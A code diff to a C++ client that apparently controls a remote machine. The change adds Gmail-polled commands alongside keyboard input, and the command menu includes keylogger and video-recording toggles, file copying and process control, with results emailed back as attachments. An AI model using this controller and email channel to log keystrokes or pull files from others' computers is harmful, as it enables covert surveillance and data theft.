@@ -1,7 +1,34 @@
 #include "client.h"
 #include "fstream"
 #include "sstream"
+#include <chrono>
+#include <thread>
+
+#ifdef _WIN32
+#include <conio.h>
+#else
+#include <sys/select.h>
+#include <termios.h>
+#include <unistd.h>
+#endif
 namespace fs = std::filesystem;
+
+bool isKeyboardHit()
+{
+#ifdef _WIN32
+  return _kbhit();
+#else
+  // The Linux/macOS code does not need to change at all.
+  struct timeval tv;
+  fd_set fds;
+  tv.tv_sec = 0;
+  tv.tv_usec = 0;
+  FD_ZERO(&fds);
+  FD_SET(STDIN_FILENO, &fds);
+  select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv);
+  return (FD_ISSET(STDIN_FILENO, &fds));
+#endif
+}
 
 bool Client::Init(std::string hostIP, std::string _port)
 {
@@ -55,105 +82,127 @@ bool Client::Init(std::string hostIP, std::string _port)
 
 void Client::GetCommand()
 {
-  std::ifstream fs("../client_secret.json");
-  if (fs)
+  using namespace std::chrono_literals;
+  auto lastEmailCheck = std::chrono::steady_clock::now();
+  const auto emailCheckInterval = 5s;
+  while (true)
   {
-    GmailClient gmail;
-    std::string check_IP;
-    gmail.GetLatestEmailBody(check_IP, command, receiver);
-    if (!command.empty() && check_IP == serverHost)
+    if (isKeyboardHit())
     {
-      fromEmail = true;
+      int choice;
+      std::string path;
+      std::string name;
+      std::cin >> choice;
+      if (std::cin.fail())
+      {
+        std::cout << "Invalid input. Please enter a number.\n";
+        std::cin.clear();
+        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+        continue;
+      }
+
+      switch (choice)
+      {
+      case 1: // COPYFILE
+        this->command = "COPYFILE";
+        std::cout << "Enter file path to copy: ";
+        std::cin >> path;
+        this->command += " " + path;
+        break;
+
+      case 2: // TOGGLE_VIDEO
+        this->command = "TOGGLE_VIDEO";
+        std::cout << "Toggling video recording...\n";
+        break;
+
+      case 3: // GET_VIDEO
+        this->command = "GET_VIDEO";
+        std::cout << "Retrieving recorded video...\n";
+        break;
+
+      case 4: // TOGGLE_KEYLOGGER
+        this->command = "TOGGLE_KEYLOGGER";
+        std::cout << "Toggling keylogger...\n";
+        break;
+
+      case 5: // GET_KEYLOGGER
+        this->command = "GET_KEYLOGGER";
+        std::cout << "Retrieving keylogger logs...\n";
+        break;
+
+      case 6: // GET_RUNNING_PROCESS
+        this->command = "GET_RUNNING_PROCESS";
+        std::cout << "Listing running processes...\n";
+        break;
+
+      case 7: // RUN_PROCESS
+        this->command = "RUN_PROCESS";
+        std::cout << "Enter process name to run (name or path): ";
+        std::cin >> name;
+        this->command += " " + name;
+        break;
+      case 8: // SHUTDOWN_PROCESS
+        this->command = "SHUTDOWN_PROCESS";
+        std::cout << "Enter process name to shutdown (name or path): ";
+        std::cin >> name;
+        this->command += " " + name;
+        break;
+
+      case 9: // SLEEP
+        this->command = "SLEEP";
+        std::cout << "Putting system to sleep...\n";
+        break;
+
+      case 10: // RESTART
+        this->command = "RESTART";
+        std::cout << "Restarting system...\n";
+        break;
+
+      case 11: // SHUTDOWN
+        this->command = "SHUTDOWN";
+        std::cout << "Shutting down system...\n";
+        break;
+
+      case 12: // EXIT
+        this->command = "EXIT";
+        std::cout << "Exiting client...\n";
+        break;
+
+      default:
+        std::cout << "Invalid choice. Please try again.\n";
+        break;
+      }
+      if (!this->command.empty())
+      {
+        fromEmail = false;
+        return;
+      }
     }
-    else
+
+    auto now = std::chrono::steady_clock::now();
+    if (now - lastEmailCheck >= emailCheckInterval)
     {
-      command.clear();
-      receiver.clear();
+      GmailClient gmail;
+      std::string check_IP;
+      gmail.GetLatestEmailBody(check_IP, this->command, this->receiver);
+
+      if (!this->command.empty() && check_IP == serverHost)
+      {
+        std::cout << "Valid command received via email: " << this->command << std::endl;
+        fromEmail = true;
+        return;
+      }
+      else
+      {
+        this->command.clear();
+        this->receiver.clear();
+      }
+
+      lastEmailCheck = now;
     }
+    std::this_thread::sleep_for(100ms);
   }
-  else
-  {
-    int choice;
-    std::string path;
-    std::string name;
-    std::cin >> choice;
-    switch (choice)
-    {
-    case 1: // COPYFILE
-      this->command = "COPYFILE";
-      std::cout << "Enter file path to copy: ";
-      std::cin >> path;
-      this->command += " " + path;
-      break;
-
-    case 2: // TOGGLE_VIDEO
-      this->command = "TOGGLE_VIDEO";
-      std::cout << "Toggling video recording...\n";
-      break;
-
-    case 3: // GET_VIDEO
-      this->command = "GET_VIDEO";
-      std::cout << "Retrieving recorded video...\n";
-      break;
-
-    case 4: // TOGGLE_KEYLOGGER
-      this->command = "TOGGLE_KEYLOGGER";
-      std::cout << "Toggling keylogger...\n";
-      break;
-
-    case 5: // GET_KEYLOGGER
-      this->command = "GET_KEYLOGGER";
-      std::cout << "Retrieving keylogger logs...\n";
-      break;
-
-    case 6: // GET_RUNNING_PROCESS
-      this->command = "GET_RUNNING_PROCESS";
-      std::cout << "Listing running processes...\n";
-      break;
-
-    case 7: // RUN_PROCESS
-      this->command = "RUN_PROCESS";
-      std::cout << "Enter process name to run (name or path): ";
-      std::cin >> name;
-      this->command += " " + name;
-      break;
-    case 8: // SHUTDOWN_PROCESS
-      this->command = "SHUTDOWN_PROCESS";
-      std::cout << "Enter process name to shutdown (name or path): ";
-      std::cin >> name;
-      this->command += " " + name;
-      break;
-
-    case 9: // SLEEP
-      this->command = "SLEEP";
-      std::cout << "Putting system to sleep...\n";
-      break;
-
-    case 10: // RESTART
-      this->command = "RESTART";
-      std::cout << "Restarting system...\n";
-      break;
-
-    case 11: // SHUTDOWN
-      this->command = "SHUTDOWN";
-      std::cout << "Shutting down system...\n";
-      break;
-
-    case 12: // EXIT
-      this->command = "EXIT";
-      std::cout << "Exiting client...\n";
-      break;
-
-    default:
-      std::cout << "Invalid choice. Please try again.\n";
-      break;
-    }
-    std::cout << "Enter Command: \n";
-    std::getline(std::cin >> std::ws, this->command);
-  }
-  fs.close();
 }
-
 void Client::SendCommand()
 {
   if (!send(connSock, command.c_str(), command.size(), 0))
@@ -164,6 +213,8 @@ void Client::SendCommand()
 
 void Client::ProcessCommand()
 {
+  if (command == "" || command.empty())
+    return;
   SendCommand();
   std::stringstream ss(command);
   std::string com, body;
@@ -174,7 +225,7 @@ void Client::ProcessCommand()
     if (fromEmail)
     {
       GmailClient gmail;
-      gmail.SendEmailAttachment(receiver,"COPIED_FILE","File: ","../data/copyfile/"+filename);
+      gmail.SendEmailAttachment(receiver, "COPIED_FILE", "File: ", "../data/copyfile/" + filename);
     }
   }
   else if (com == "GET_VIDEO")
@@ -183,7 +234,7 @@ void Client::ProcessCommand()
     if (fromEmail)
     {
       GmailClient gmail;
-      gmail.SendEmailAttachment(receiver,"LATEST_VIDEO","File: ","../data/video/"+filename);
+      gmail.SendEmailAttachment(receiver, "LATEST_VIDEO", "File: ", "../data/video/" + filename);
     }
   }
   else if (com == "GET_KEYLOGGER")
@@ -192,7 +243,7 @@ void Client::ProcessCommand()
     if (fromEmail)
     {
       GmailClient gmail;
-      gmail.SendEmailAttachment(receiver,"KEYLOG_FILE","File: ","../data/keylogger/"+filename);
+      gmail.SendEmailAttachment(receiver, "KEYLOG_FILE", "File: ", "../data/keylogger/" + filename);
     }
   }
   else if (com == "GET_RUNNING_PROCESS")
@@ -201,7 +252,7 @@ void Client::ProcessCommand()
     if (fromEmail)
     {
       GmailClient gmail;
-      gmail.SendEmailAttachment(receiver,"PROCESS_FILE","File: ","../data/process/"+filename);
+      gmail.SendEmailAttachment(receiver, "PROCESS_FILE", "File: ", "../data/process/" + filename);
     }
   }
 }
@@ -223,7 +274,6 @@ void Client::ReceiveFile(std::string pathFolder)
     return line;
   };
 
-  
   std::string path_header = read_line_from_socket();
   if (path_header.rfind("ERROR:", 0) == 0)
   {
